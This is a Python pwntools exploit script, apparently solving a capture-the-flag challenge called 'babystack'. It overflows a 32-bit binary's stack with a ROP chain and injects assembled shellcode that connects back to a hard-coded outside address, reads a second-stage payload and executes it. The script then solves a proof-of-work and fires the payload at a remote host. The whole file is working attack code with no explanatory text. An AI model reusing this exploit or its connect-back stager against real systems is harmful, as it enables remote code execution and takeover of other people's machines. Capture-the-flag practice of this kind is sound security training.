from pwn import *
import os
from hashlib import sha256


ebp = 0x0804a100+0x8
payload = "a"*0x28 + p32(ebp)
payload += flat([
0x8048300,
0x8048455,
0x0,
0x0804a100,
0x60-4,
])



shellcode_addr =  0x0804a300
ebx = 0x2ac35b7
stack = flat([0x1000,0x1000,
0x0,
0x8048300,
0x080484e9,
0x0,
0x804a00c-0x3,
0x7,
0x080484ea,
0x100000,
0x0,
0x08048408,
0x08048408,
0x08048408,
0x08048408,
0x08048408,
0x08048408,
0x08048408,
0x08048605,
0x080482e9,
ebx,
0x080484e6,
0x0,
0x0,
0x0,
0x080482e9,
0x0804a000,
0x8048300,
0x0,
0x804a178,
],)

s = """
push   0x0
push   0x1
push   0x2
push   0x66
pop    eax
push   0x1
pop    ebx
mov    ecx,esp
int    0x80
push   0xb9a7718c
push   0x10270002
mov    ecx,esp
push   0x10
push   ecx
push   eax
push   0x66
pop    eax
push   0x3
pop    ebx
mov    ecx,esp
int    0x80
mov    eax,0x3
mov    ebx,eax
mov    ecx,0x804a300
mov    edx,0x100
int    0x80
call    ecx
"""
ss = asm(s)

stack+=ss

payload = "a"*0x28 + p32(ebp)
payload += flat([
0x8048300,
0x8048455,
0x0,
0x0804a100,
0xc0-4,
])



payloads = payload.ljust(0x40,'\x00')+stack

print len(payloads)

payloads = payloads.ljust(0x100,'\x7c')

print len(payloads)

#r = process(["./babystack"])




#r.send(payloads[:0x40])

#r.recvrepeat(1)

#r.send(payloads[0x40:0x100-4])

#r.recvrepeat(1)


#input()
#r.send(payloads[0x100-4:])

#r.interactive()


#r = process(["./pow.py"])

r = remote("202.120.7.202",6666)
chal = r.recvline()[:-1]
sol = os.urandom(4)

while not sha256(chal + sol).digest().startswith('\0\0\0'):
        sol = os.urandom(4)

r.send(sol)
print "wait"
r.recvrepeat(1)
r.send(payloads)
r.interactive()

